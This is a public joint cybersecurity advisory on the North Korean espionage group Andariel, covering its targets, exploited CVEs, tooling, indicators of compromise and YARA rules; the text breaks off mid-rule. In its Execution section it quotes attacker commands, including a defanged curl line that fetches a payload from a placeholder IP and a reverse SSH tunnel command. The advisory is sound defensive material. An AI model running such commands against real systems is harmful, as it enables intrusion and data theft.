{
  "markdown": "Co-Authored by :  \n       \n  \n \nTo report suspicious or criminal activity related to information found in this j oint Cybersecurity Advisory, contact \nyour local FBI field office or CISAs 24/7 Operations Center at Report@cisa.gov or (888) 282- 0870. When \navailable, please include the following information regarding the incident: date, time, and location of the incident; \ntype of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.  \n This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when \ninformation carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and \nprocedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol,\n see http://www.cisa.gov/tlp .  \nJuly 25, 2024  \n TLP:CLEAR  \nProduct ID: AA24-207A  \n \nTLP: CLEAR  \n North Korea Cyber Group Conducts Global \nEspionage Campaign to Advance Regimes \nMilitary and Nuclear Programs  \nSummary \nThe U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this \nCybersecurity Advisory to highlight cyber espionage activity associated with the Democratic Peoples Republic of Korea (DPRK)s Reconnaissance General Bureau (RGB) 3\nrd Bureau based in Pyongyang and \nSinuiju:  \n U.S. Cyber National Mission Force (CNMF)  \n U.S. Cyb ersecurity and Infrastructure Security Agency (CISA)  \n U.S. Department of Defense Cyber Crime Center (DC3)  \n U.S. National Security Agency (NSA)  \n Republic of Koreas National Intelligence Service (NIS)  \n Republic of Koreas National Police Agency (NPA)  \n United Kin gdoms National Cyber Security Centre  (NCSC)  \nThe RGB 3rd Bureau includes a DPRK (aka North Korean) state -sponsored cyber group known publicly as \nAndariel , Onyx Sleet  (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa . The group \nprimarily targets defense, aerospace, nuclear, and engineering  entities to obtain sensitive and classified \n\n \nPage 2 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n technical information and intellectual property to advance the regimes military and nuclear programs and \nambitions . The authoring agencies believe the group and the cyber  techniques remain an ongoing threat to \nvarious industry sectors worldwide, including but not limited to entities in their respective countries, as well \nas in  Japan and India. RGB 3rd Bureau actors fun d their espionage activity through ransomware operations \nagainst U.S. healthcare entities.  \nThe actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gai n access to sensitive information and applications \nfor further exploitation. The actors then employ standard system discovery and enumeration  techniques , \nestablish  persistence using Scheduled Tasks, and perform privilege escalation using common credential \nstealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral  movement, and data exfiltration.  \nThe actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.  \nThe authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities \nin a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and \nstrengthen authentication and remote access  protections. While not exclusive, entities involved  in or \nassociated with the below industries and fields should remain vigilant in defending their networks from North Korea state -sponsored cyber operations . \nFor additional information on DPRK state -sponso red malicious cyber activity, see CISAs \nNorth Korea Cyber \nThreat Overview and Advisories  webpage . \nFor a downl oadable copy of associated indicators of compromise (IOCs), see:  \n AA24 -207A STIX XML  (297 KB) \n AA24 -207A STIX JSON  (141 KB) \n  \n\n \nPage 3 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Table of Contents  \nRGB 3rd Bureau  .................................................................................................................................................. 4 \nCyber Espio nage  ............................................................................................................................................. 4 \nRansomware  ................................................................................................................................................... 5 \nMalicious Cyber Espionage Activity  ................................................................................................................... 5 \nReconnaissance and Enumeration  ............................................................................................................... 5 \nResource Development, Tooling, and Remote Access Tools ....................................................................... 6 \nCommodity Malware  ...................................................................................................................................... 7 \nInitial Access  ................................................................................................................................................... 7 \nExecution  ........................................................................................................................................................ 8 \nDefense Evasion  ............................................................................................................................................. 8 \nCredential Access  ........................................................................................................................................... 8 \nDiscovery  ......................................................................................................................................................... 8 \nLateral Movement  .......................................................................................................................................... 9 \nCommand and Control  ................................................................................................................................... 9 \nCollection and Exfiltration  .............................................................................................................................. 9 \nIndicators of Compromise  ................................ ................................ ................................ ................................  9 \nDetection Methods  ................................ ................................ ................................ ................................ ........  13 \nMitigation Measures  ................................ ................................ ................................ ................................ ...... 23 \nLog4Shell and Other Log4j Vulnerabilities  .....................................................................................................23 \nWeb Shell Malware  ..........................................................................................................................................23 \nEndpoint Activity  ...............................................................................................................................................23 \nCommand Line Activity and Remote Access  ..................................................................................................24 \nPacking  .............................................................................................................................................................24 \nAdditional Mitigation Measures for Malicious Activities  ................................................................................24 \nDPRK Rewards for Justice  ...............................................................................................................................24 \nAcknowledgements  ................................ ................................ ................................ ................................ ....... 24 \nDisclaimer of  Endorsement  .............................................................................................................................24 \nTrademark Recognition  ....................................................................................................................................25 \nPurpose  .............................................................................................................................................................25 \nContact  ..............................................................................................................................................................25 \nReferences  ................................ ................................ ................................ ................................ ....................  25 \nAppendix: MITRE ATT&CK Techniques and Software  ................................ ................................ ....................  27 \n\n \nPage 4 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Technical Details  \nRGB 3rd Bureau  \nAndariel  (also known as Onyx Sleet , formerly PLUTONIUM, DarkSeoul, Silent Chollima, and \nStonefly/Clasiopa)  is a North Korean state -sponsored cyber group , under the RGB 3rd Bureau,  based in \nPyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive \nattacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and \nransomware operations.  \nCyber Espionage \nThe actors currently target sensitive militar y information and intellectual property of defense, aerospace, \nnuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. \nSee Table 1  for more victimology information.  \nTable 1 . Andariel Cyber Espionage Victimology  \nIndustry   Information Targeted  \nDefense   Heavy and light tanks and self -propelled howitzers  \n Light strike vehicles and ammunition supply vehicles \n Littoral combat ships and combatant craft  \n Submarines, torpedoes, unmanned underwater vehicles (UUVs), and autonomous \nunderwater vehicles (AUVs)  \n Modeling and simulation services  \nAerospace   Fighter aircraft and unmanned aerial vehicles (UAV s)  \n Missiles and missile defense systems  \n Satellites, satellite communications, and nano -satellite technology  \n Surveillance radar, phased -array radar, and other radar systems \nNuclear   Uranium processing and enrichment  \n Material waste and storage  \n Nuclear power plants  \n Government nuclear facilities and research institutes  \nEngineering   Shipbuilding and marine engineering  \n Robot machinery and mechanical arms  \n Additive manufacturing and 3D printing components and technology  \n Casting, fabrication, high -heat metal molding, and rubber and plastic molding  \n Machining processes and technology  \nThe information targeted such as contract specifications, bills of materials, project details, design \ndrawings, and engineering documents has military and civilian applications and leads the authoring \n\n \nPage 5 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n agencies to assess one of the groups chief responsibilities is satisfying collection requirements for \nPyongyangs nuclear and defense programs.  \nRansomware  \nAndariel actors fund their espionage act ivity through ransomware operations against U.S. healthcare \nentities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware  and \ncyber espionage against the same entity. For more information on this ransomware activity, see joint advisories \n#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber \nActivities  and North Korean State -Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare \nand Public Health Sector . \nMalicious Cyber Espionage Activity  \nThis advisory uses the MITRE ATT&CK for Enterprise  framework , version 15 . See the Appendix: MITRE \nATT&CK Techniques for all referenced tactics and techniques.  \nReconnaissance and Enumeration \nWhile there is limited available information on the groups initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as \nvulner abilities in public -facing web servers [T1595, T1592\n]. The actors gather open source information \nabout their victims for use in targeting [ T1591 ] and research Common Vulnerabilities and Exposures \n(CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [\nT1596 ]. CVEs researched include:   \n CVE-2023-46604  Apache ActiveMQ  \n CVE-2023-42793  TeamCity  \n CVE-2023-3519  Citrix NetScaler  \n CVE-2023-35078  Ivanti Endpoint Manager Mobile (EPMM)  \n CVE-2023-34362  MOVEIt  \n CVE-2023-33246  RocketMQ  \n CVE-2023-32784  KeePass  \n CVE-2023-32315  Openfire  \n CVE-2023-3079  Google Chromium V8 Type Confusion  \n CVE-2023-28771 and CVE -2023-33010  Zyxell firmware  \n CVE-2023-2868  Barracuda Email Security Gateway  \n CVE-2023-27997  FortiGate SSL VPN  \n CVE-2023-25690  Apache HTTP Server  \n CVE-2023-21932  Oracle Hospitality O pera 5  \n CVE-2023-0669  GoAnywhere MFT  \n CVE-2022-47966  ManageEngine  \n\n \nPage 6 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  CVE-2022-41352 and CVE -2022-27925   Zimbra Collaboration Suite  \n CVE-2022-30190   Microsoft Windows Support Diagnostic Tool  \n CVE-2022-25064   TP-LINK   \n CVE-2022-24990 and CVE -2021-45837   TerraMaster NAS  \n CVE-2022-24785   Moment.js  \n CVE-2022-24665, CVE -2022-24664, and CVE -2022 -24663  PHP Everywhere  \n CVE-2022-22965   Spring4Shell  \n CVE-2022-22947   Spring Cloud Gateway  \n CVE-2022-22005   Microsoft SharePoint Server  \n CVE-2022-21882   Win32k Elevation of Privilege  \n CVE-2021-44228   Apache Log4j  \n CVE-2021-44142   Samba vfs_fruit module  \n CVE-2021-43226, CEV -2021-43207, CVE -2021 -36955   Windows log file vulnerabilities  \n CVE-2021-41773   Apache HTTP Server 2.4.49  \n CVE-2021-40684   Talend ESB Runtime  \n CVE-2021-3018   IPeakCMS 3.5  \n CVE-2021-20038   SMA100 Apache httpd server (SonicWall)  \n CVE-2021-20028   SonicWall Secure Remote Access (SRA)  \n CVE-2019-15637   Tableau  \n CVE-2019-7609   Kibana  \n CVE-2019-0708   Microsoft Remote Desktop Services  \n CVE-2017-4946   VMware V4H and V4PA  \nResource Development, Tooling, and Remote Access Tools  \nThe actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the \ngrou p has developed RATs, including the following, to permit remote access and manipulation of systems \nand lateral movement.  \n Atharvan  \n ELF Backdoor  \n Jupiter  \n MagicRAT  \n No Pineapple  \n TigerRAT  \n Valefor/VSingle  \n ValidAlpha  \n YamaBot   NukeSped  \n Goat RAT  \n Black RAT  \n AndarLoader  \n DurianBeacon  \n Trifaux  \n KaosRAT  \n Preft  \n Andariel Scheduled Task Malware  \n\n \nPage 7 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  BottomLoader (see Cisco Talos blog \nOperation Blacksmi th) \n NineRAT (see Cisco Talos blog Operation Blacksmith)   DLang (see Cisco Talos blog Operation Blacksmith)  \n Nestdoor (see AhnLab blog)  \nThese tools include functionality for executing arbitrary command s, keylogging, screenshots, listing files \nand directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [ T1587.001 , T1587.004\n]. The tools \nallow the actors to maintain access to the victim system w ith each implant having a designated C2 node.    \nCommodity Malware and Dual -Use Applications  \nCommodity malware is malicious software widely available for purchase or use and is leveraged by \nnumerous different threat actors. Dual -use applications are software tools widely available for purchase or \nuse that are commonly utilized by administrators and users for system administration or other legitimate \npurposes and also by threat actors for malicious activities. These dual -use applications may reside locally, \nknown as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use \nof publicly available malware and dual -use applications . The use of publicly available malware  and dual -\nuse applications  enables the actors t o conceal and obfuscate their identities and leads to attribution \nproblems. The authoring agencies are reliant on the use of custom malware and loaders, along with \noverlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved \ngreat success  obfuscating their identities by  leveraging open source malware. The authoring agencies have \nidentified the following open  source  and dual -use tools as used and/or customized by the actors:  \n 3Proxy [ T1090 ]  \n AdFind [ S0552 ] \n AsyncRAT  \n DeimosC2 \n Impacket [T1090 ]  \n Juggernaut [ T1040 ]  \n Lilith RAT  \n ORVX Web Shell  \n Mimikatz [ S0002 ]   PLINK [ T1572 ] \n ProcDump [ T1003 ] \n PuTTY [ T1572 ] \n SOCKS5 [ T1090 ] \n Stunnel [ T1572 ]  \n Web Shell by Orb (WSO)  \n WinRAR [ T1560 ] \n WinSCP [ T1048 ]  \n RDP Wrapper [ T1572 ] \nInitial Access  \nThe actors gain initial access through widespread exploitation of web servers through known \nvulnerabilities, such as CVE -2021-44228 (Log4Shell) in Apaches Log4j software library  and other CVEs \nlisted above , to deploy web shells and gain access to sensitive information and applications for fu rther \nexploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public -\nfacing devices and have conducted widespread activity against a number of different organizations simultaneously [ T1190\n]. \n\n \nPage 8 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n Execution  \nThe actors are well -versed in using native tools and processes on systems, known as living off the land \n(LOTL). They use Windows command line, PowerShell, Windo ws Management Instrumentation command \nline (WMIC), and Linux bash for system, network, and account enumeration. While individual commands \ntypically vary, the authoring agencies assess the actors prefer netstat  commands, such as netstat \nnaop and netstat noa [T1059 ]. Example commands used by the actors include the following:  \n netstat  naop  \n netstat  noa \n pvhost.exe - N -R [IP Address]:[Port] -P [Port] -l [ username] -pw [password] <Remote_IP>  \n curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c: \\users \\public \\notify[.]exe \n C:\\windows \\system32\\ cmd.exe /c systeminfo | findstr Logon  \nThese actors often make typos and other mistakes, indicating that the commands are not directly copied \nfrom a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as Microsoft Cooperation (rather than \nMicrosoft Corporation) found across numerous RGB 3\nrd Bureau malware samples.  \nDefense Evasion  \nThe actors routinely pack late -stage tooling in VMProtect and Themida. Malicious tooling packed with these \nand other commercial tools have advanced anti -debugging and detection capabilities. T hese files are \ntypically multiple megabytes in size and often contain unusual file section names such as vmp0  and vmp1  \nfor VMProtect and Themida or randomized file section names for Themida [ T1027 ].  \nCredential Access  \nThe actors employ a multi -pronged approach to stealing credentials to gain additional access to systems, \nincluding the use of  publicly available credential theft utilities and dual -use tools such as Mimikatz, \nDumpert, and ProcDump , and accessing the Active Directory domain database through targeting of the \nNTDS.dit  file. The authoring agencies assess the actors change settings on compromised systems to  \nforce the system to store credentials and then use the aforementioned tools to steal credentials. In one \ninstance, the actors used the vssadmin command -line utility to back up a volume to retrieve a copy of the \nNTDS.dit  file containing Active Directory da ta. In another instance, the actors were observed collecting \nregistry hive data for offline extraction of credentials [ T1003 ].  \nDiscovery  \nThe actors u sed customized file system enumeration tooling written in .NET. The tool is capable of \nreceiving and executing command line arguments to enumerate directories and files and compress output \nfiles. The tool collects the following information for each drive t argeted on a system: depth relative to \nstarting path, name, last write time, last access time, creation time, size, and attributes [ T1087, T1083 ].  \n\n \nPage 9 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n The actors also enumerate directories and files of connected devices using Server Message Block (SMB) \nprotocol, which enables network file sharing and the ability to request services and programs from a network [ T1021.002\n]. \nLateral Movement  \nThe actors also use system logging for discovery to move late rally. The group logs active window changes, \nclipboard data, and keystrokes and saves the collected logging information to the %Temp%  directory.  \nThe actors have also used Remote Desktop Protocol (RDP) to move laterally [ T1021 ].  \nCommand and Control  \nThe actors leverage techniques and infrastructure positioned around the world to send commands to \ncompromised systems. The actors disguise their malware within HTTP packets to appear as benign \nnetwork traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. \nTunneling enables the actors to perform C2 operations despite network configurations that would typically \npose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy  [T1090, T1071\n]. \nCollection and Exfiltration  \nMalware previously used by the actors  permitted placement and access to search through files that could \nbe of interest, including scanning computer files for keywords related to defense and military sectors in \nEnglish and Korean. The actors identify data for theft by enumerating files and fol ders across many \ndirectories and servers using command -line activity or functionality built into custom tools. The actors \ncollect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victims \nenvironment with other malicious tooling  [T1560, T1039 ]. \nThe actors typ ically exfiltrate data to web services such as cloud storage or servers not associated with \ntheir primary C2. Notably, the actors have been observed logging into actor -controlled cloud -based storage \nservice accounts directly from victim networks to exfiltr ate data [ T1567 ]. The actors have also been \nobserved using the utilities PuTTY and WinSCP to exfiltrate data to North Korea -controlled servers via File \nTransfer P rotocol (FTP) and other protocols [ T1048 ].  \nThe actors have also been identified staging files for exfiltration on victim machines, establish ing R emote \nDesktop P rotocol connections, and conducting HTTP GET  requests on port 80  to receive information \n[T1021 ]. \nIndicators of Compromise  \nSee below for  Andariel  IOCs. \nThe following include observed MD5 hashes:  \n 88a7c84ac7f7ed310b5ee791ec8bd6c5  \n 6ab4eb4c23c9e419fbba85884ea141f4   97ce00c7ef1f7d98b48291d73d900181  \n 079b4588eaa99a1e802adf5e0b26d8aa  \n\n \nPage 10 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  0873b5744d8ab6e3fe7c9754cf7761a3  \n 0d696d27bae69a62def82e308d28857a  \n 0ecf4bac2b070cf40f0b17e18ce312e6  \n 17c46ed7b80c2e4dbea6d0e88ea0827c  \n 1f2410c3c25dadf9e0943cd634558800  \n 2968c20a07cfc97a167aa3dd54124cda  \n 33e85d0f3ef2020cdb0fc3c8d80e8 e69 \n 4118d9adce7350c3eedeb056a3335346  \n 4aa57e1c66c2e01f2da3f106ed2303fa  \n 58ad3103295afcc22bde8d81e77c282f  \n 5c41cbf8a7620e10f158f6b70963d1cb  \n 61a949553d35f31957db6442f36730c5  \n 72a22afde3f820422cfdbba7a4cbabde  \n 84bd45e223b018e67e4662c057f2c47e  \n 86465d92f0d690b62866f52f5283b9fc  \n 8b395cc6ecdec0900facf6e93ec48fbb  \n 97f352e2808c78eef9b31c758ca13032  \n a50f3b7aa11b977ae89285b60968aa67  \n afd25ce56b9808c5ed7eade75d2e12a7  \n afdeb24975a318fc5f20d9e61422a308  \n b697b81b341692a0b137b2c748310ea7  \n bcac28919fa33704a01d7a9e5e3ddf3f  \n c027d641c4c1e9d9ad048cda2af85db6  \n c892c60817e6399f939987bd2bf5dee0  \n cdeae978f3293f4e783761bc61b34810  \n d0f310c99476f1712ac082f78dd29fdc  \n d8da33fae924b991b776797ba8cde24c  \n e230c5728f9ea5a94e390e7da7bf1ffa  \n f4d46629ca15313b94992f3798718df7  \n fb84a392601fc19aeb7f8ce11b3a4907  \n ff3194d3d5810a42858f3e22c91500b1  \n 13b4ce1fc26d400d34ede460a8530d93  \n 41895c5416fdc82f7e0babc6bb6c7216  \n c2f8c9bb7df688d0a7030a96314bb493  \n 33a3da2de78418b89a603e28a1e8852c   4896da30a745079cd6265b6332886d45  \n 73eb2f4f101aab6158c615094f7a632a  \n 7f33d2d2a 2ce9c195202acb59de31eee  \n e1afd01400ef405e46091e8ef10c721c  \n fe25c192875ec1914b8880ea3896cda2  \n 232586f8cfe82b80fd0dfa6ed8795c56  \n c1f266f7ec886278f030e7d7cd4e9131  \n 49bb2ad67a8c5dfbfe8db2169e6fa46e  \n beb199b15bd075996fa8d6a0ed554ca8  \n 4053ca3e37ed1f8d37b29eed61c2e729  \n 3a0c8ae783116c1840740417c4fbe678  \n 0414a2ab718d44bf6f7103cff287b312  \n ca564428a29faf1a613f35d9fa36313f  \n ad6d4eb34d29e350f96dc8df6d8a092e  \n dc70dc9845aa747001ebf2a02467c203  \n 3d2ec58f37c8176e0dbcc47ff93e5a76  \n 0a09b7f2317b3d5f057180be6b6d0755  \n 1ffccc23fef2964e9b1747098c19d956  \n 9112efb49cae021abebd3e9a564e6ca4  \n ac0ada011f1544aa3a1cf27a26f2e288  \n 0211a3160cc5871cbcd4e5514449162b  \n 7416ea48102e2715c87edd49ddbd1526  \n a2aefb7ab6c644aa8eeb482e27b2dbc4  \n e7fd7f48fbf5635a04e302af50dfb651  \n 33b2b5b7c830c34c688cf6ced287e5be  \n e5410abaaac69c88db84ab3d0e9485ac  \n eb35b75369805e7a6371577b1d2c4531  \n 5a3f3f75048b9cec177838fb8b40b945  \n 9d7bd0caed10cc002670faff7ca130f5  \n 8434cdd34425916be234b19f933ad7ea  \n bbaee4fe73ccff1097d635422fdc0483  \n 79e474e056b4798e0a3e7c60dd67fd28  \n 95c276215 dcc1bd7606c0cb2be06bf70  \n 426bb55531e8e3055c942a1a035e46b9  \n cfae52529468034dbbb40c9a985fa504  \n\n \nPage 11 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  deae4be61c90ad6d499f5bdac5dad242  \n bda0686d02a8b7685adf937cbcd35f46  \n 6de6c27ca8f4e00f0b3e8ff5185a59d1  \n c61a8c4f6f6870c7ca0013e084b893d2  \n 5291aed100cc48415636c4875592f70c  \n f4795f7aec4389c8323f7f40b50ae46f  \n cf1a90e458966bcba8286d46d6ab052c  \n 792370eb01e16ac3dc511143932d0e1d  \n 612538328e0c4f3e445fb58ef811336a  \n 9767aa592ec2d6ae3c7d40b6049d0466  \n b22fd0604c4f189f2b7a59c8f48882dd  \n e53ca714787a86c13f07942a5 6d64efa  \n c7b09f1dd0a5694de677f3ecceda41b7  \n c8346b39418f92725719f364068a218d  \n 730bff14e80ffd7737a97cdf11362ab5  \n 9a481bc83fea1dea3e3bdfff5e154d44  \n ddb1f970371fa32faae61fc5b8423d4b  \n 6c2b947921e7c77d9af62ce9a3ed7621  \n 977d30b261f64cc582b48960909d0a89  \n 7ce51b56a6b0f8f78056ddfc5b5de67c \n dd9625be4a1201c6dfb205c12cf3a381  \n ecb4a09618e2aba77ea37bd011d7d7f7  \n 0fd8c6f56c52c21c061a94e5765b27b4  \n c90d094a8fbeaa8a0083c7372bfc1897   0055a266aa536b2fdadb3336ef8d4fba  \n 55bb271bbbf19108fec73d224c9b4218  \n 0c046a2f5304ed8d768795a49b99d6e4  \n f34664e0d 9a10974da117c1ca859dba8  \n a2c2099d503fcc29478205f5aef0283b  \n e439f850aa8ead560c99a8d93e472225  \n 7c30ed6a612a1fd252565300c03c7523  \n 81738405a7783c09906da5c7212e606b  \n c027d641c4c1e9d9ad048cda2af85db6  \n eb7ba9f7424dffdb7d695b00007a3c6d  \n 3e9ee5982e3054dc76d3ba5cc88ae3de  \n 073e3170a8e7537ff985ec8316319351  \n 9b0e7c460a80f740d455a7521f0eada1  \n 2d02f5499d35a8dffb4c8bc0b7fec5c2  \n 0984954526232f7d05910aa5b07c5893  \n 4156a7283284ece739e1bae05f99e17c  \n 3026d419ee140f3c6acd5bff54132795  \n 7aa132c0cc63a38fb4d1789553266fc7 \n 1a0811472fad0ff507a92c957542fffd  \n f8aef59d0c5afe8df31e11a1984fbc0a  \n 82491b42b9a2d34b13137e36784a67d7  \n 0a199944f757d5615164e8808a3c712a  \n 9c97ea18da290a6833a1d36e2d419efc  \n 16f768eac33f79775a9672018e0d64f5  \nThe following include observ ed SHA -256 hashes:  \n ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6  \n db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984  \n 773760fd71d52457ba53a314f15dddb1a74e8b2f5a90e5e150dea48a21aa76df  \n 05e9fe8e9e693cb073ba82096c291145c953ca3a3f 8b3974f9c66d15c1a3a11d  \n e3027062e602c5d1812c039739e2f93fc78341a67b77692567a4690935123abe  \n 1962ebb7bf8d2b306c6f3b55c3dcd69a755eeff1a17577b7606894b781841c3a  \n f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb  \n 6db57bbc2d07343dd6ceba0f53c73756af78f0 9fe1cb5ce8e8008e5e7242eae1  \n b7435d23769e79fcbe69b28df4aef062685d1a631892c2354f96d833eae467b e \n 66415464a0795d0569efa5cb5664785f74ed0b92a593280d689f3a2ac68dca66  \n\n \nPage 12 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  def2f01fbd4be85f48101e5ab7ddd82efb720e67daa6838f30fd8dcda1977563  \n 323cbe7a3d050230cfaa822c2a22160b4f8c5fe65481dd329841ee2754b522d9  \n 74529dd15d1953a47f0d7ecc2916b2b92865274a106e453a24943ca9ee434643  \n 1e4de822695570421eb2f12fdfe1d32ab8639655e12180a7ab3cf429e7811b8f  \n 8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5  \n c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f  \n dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469  \n 90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4  \n 452ca47230afd4bb85c45af54fcacbfa544208ef8b4604c3c5caefe3a64dcc19 \n 199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1  \n 2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc  \n ce779e30502ecee991260fd342cc0d7d5f73d1a070395b4120b8d 300ad11d694  \n db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984  \n c28bb61de4a6ad1c5e225ad9ec2eaf4a6c8ccfff40cf45a640499c0adb0d8740 \n 34d5a5d8bec893519f204b573c33d54537b093c52df01b3d8c518af08ee94947  \n 664f8d19af3400a325998b332343a9304f03bab9738ddab1530869eff13dae54  \n 772b06f34facf6a2ce351b8679ff957cf601ef3ad29645935cb050b4184c8d51  \n aa29bf4292b68d197f4d8ca026b97ec7785796edcb644db625a8f8b66733ab54  \n 9a5504dcfb7e664259bfa58c46cfd33e554225daf1cedea2ec2a9d83bbbfe238  \n c2500a6e12f22b16e221ba01952b69c92278cd0563228 3d8b84c55c916efe27c  \n 8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b  \n 38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07 \nThe following include a list of user agent strings used by the actors:  \n Mozilla/5.0 (X11; Linux x86_64; rv: 91.0) Gecko/20100101 Firefox/91.0  \n Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0  \n Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0  \n Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0  \n Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 \n Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 \nSafari/537.36 SE 2.X MetaSr 1.0  \n Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36  \n Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0  \n Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)  \n Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5 7.0) Gecko/20100101 Firefox/57.0  \n\n \nPage 13 of 30  |  Product ID : AA24 -207A  TLP: CLEAR  \nTLP: CLEAR  \n  Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0  \n Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0  \nDetection Methods  \nSee Table 2  for YARA rules, created by the FBI, authoring partners, and private industry, that can be used \nto detect malware used by the actors.  \nTable 2 . YARA Rules  \nrule Andariel_ScheduledTask_Loader  \n{ \n    strings:  \n        $obfuscation1 = { B8 02 00 00 00 48 6B C0 00 B9 CD FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 \n00 00 48 6B C0 01 B9 CC FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 02 B9 8D FF 00 \n00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 03 B9 9A FF 00 00 66 89 8C 04 60 01 00 00 B8 \n02 00 00 00 48 6B C0 04 B9 8C FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 05 B9 8A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 06 33 C9 66 89 8C 04 60 01 00 00 }  \n  $obfuscation2 = { 48 6B C0 02 C6 44 04 20 BA B8 01 00 00 00 48 6B C0 03 C6 44 04 20 \n9A B8 01 00 00 00 48 6B C0 04 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 05 C6 44 04 20 8A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 9C B8 01 00 00 00 }  \n  $obfusca tion3 = { 48 6B C0 00 C6 44 04 20 A8 B8 01 00 00 00 48 6B C0 01 C6 44 04 20 \n9A B8 01 00 00 00 48 6B C0 02 C6 44 04 20 93 B8 01 00 00 00 48 6B C0 03 C6 44 04 20 96 B8 01 00 00 00 48 6B C0 04 C6 44 04 20 B9 B8 01 00 00 00 48 6B C0 05 C6 44 04 20 9A B8 01 00 00 00 48 6B \nC0 06 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 07 C6 44 04 20 9E B8 01 00 00 00 48 6B C0 08 C6 44 \n04 20 9A B8 01 00 00 00 48 6B C0 09 C6 44 04 20 8D B8 01 00 00 00 48 6B C0 0A C6 44 04 20 BC B8 01 00 00 00 }  \n    condition:  \n        uint16(0) == 0x 5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3  \n} \nrule Andariel_KaosRAT_Yamabot  \n{ \n \n    strings:  \n        $str1 = \"/kaos/\"  \n        $str2 = \"Abstand [\"  \n        $str3 = \"] 